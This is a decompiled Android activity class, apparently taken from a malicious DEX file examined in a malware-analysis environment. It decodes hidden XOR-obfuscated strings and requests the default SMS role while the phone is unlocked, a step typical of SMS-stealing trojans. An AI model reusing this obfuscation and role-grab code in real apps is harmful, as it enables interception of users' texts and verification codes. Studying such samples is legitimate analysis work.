package com.zjxyxnvvp.nxvxchltf;

import android.app.Activity;
import android.app.KeyguardManager;
import android.app.role.RoleManager;
import android.os.Build;
import android.os.Bundle;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class opnoPAWNDioaNDW extends Activity {
    private static short[] $ = {21927, 21929, 21941, 21931, 21945, 21933, 21950, 21928, 29432, 29431, 29437, 29419, 29430, 29424, 29437, 29367, 29432, 29417, 29417, 29367, 29419, 29430, 29429, 29436, 29367, 29386, 29396, 29386};

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        if (Build.VERSION.SDK_INT >= 29) {
            RoleManager roleManager = (RoleManager) getSystemService(RoleManager.class);
            if (!((KeyguardManager) getSystemService($(0, 8, 21964))).isKeyguardLocked()) {
                String $2 = $(8, 28, 29337);
                if (roleManager.isRoleAvailable($2) && !roleManager.isRoleHeld($2)) {
                    startActivityForResult(roleManager.createRequestRoleIntent($2), 1);
                }
            } else {
                return;
            }
        }
        finish();
    }
}
